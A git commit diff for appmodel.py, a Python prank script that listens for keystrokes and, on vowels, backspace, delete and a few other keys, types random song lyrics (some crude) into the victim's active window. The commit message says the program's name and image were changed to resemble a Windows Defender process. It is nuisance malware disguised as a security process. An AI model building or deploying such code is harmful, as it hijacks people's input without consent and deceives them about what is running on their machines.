4e7cde9361ed66ce08044f88ac10a15e5fd12108
Sola-Alabi <33036683+Sola-Alabi@users.noreply.github.com>
2019-10-07 10:58:37 -0400

    Updated the python source code to use listener
    This reduced the cpu usage drastically (from about 30% to <5%) additionally changed the image/name to resemble a windows defender process

--- appmodel.py
+++ appmodel.py
@@ -1,6 +1,8 @@
-from pyautogui import press, typewrite, hotkey
+from pyautogui import press, typewrite, hotkey, time
 import keyboard
 import random
+from pynput.keyboard import Key, Listener
+
 #randy contains a list of common song lyrics
 randy = ["Move b***h get out the way", "drop it like its hot", "she got a big booty so I call her big booty", "do you ever feel, like a plastic bag",
             "I’m so 3008, you’re so 2000 and late", "Like a sprained ankle, boy, I ain’t nothin’ to play with", "Seven a.m., waking up in the morning Gotta be fresh, gotta go downstairs"
@@ -8,13 +10,20 @@ randy = ["Move b***h get out the way", "drop it like its hot", "she got a big bo
             "Rah, rah, ah, ah, ah, roma, roma, ma. Gaga, ooh, la, la... want your bad romance!", "And I was like baby, baby, baby oh like baby, baby, baby no",
             "There's vomit on his sweater already, mom's spaghetti", "My milkshake brings all the boys to the yard"]
 
-while True:  # making a loop
+def on_press(key):
     try:  # used try so that if user pressed other than the given key error will not be shown
         # if any vowel key is pressed
-        if keyboard.is_pressed('a') or keyboard.is_pressed('e') or keyboard.is_pressed('i') or keyboard.is_pressed('o') or keyboard.is_pressed('u') or keyboard.is_pressed('s') or keyboard.is_pressed('y') or keyboard.is_pressed('r') or keyboard.is_pressed('backspace') :
+        if keyboard.is_pressed('a') or keyboard.is_pressed('e') or keyboard.is_pressed('i') or keyboard.is_pressed('o') or keyboard.is_pressed('u') or keyboard.is_pressed('s') or keyboard.is_pressed('y') or keyboard.is_pressed('r') or keyboard.is_pressed('backspace') or keyboard.is_pressed('delete') :
             lyric = str(random.sample(randy,1)[0]) + "\n"
             typewrite(lyric)
     except:
-        continue
+        pass
 
-keyboard.press()
+def on_release(key):
+    return True
+
+# Collect events until released
+with Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
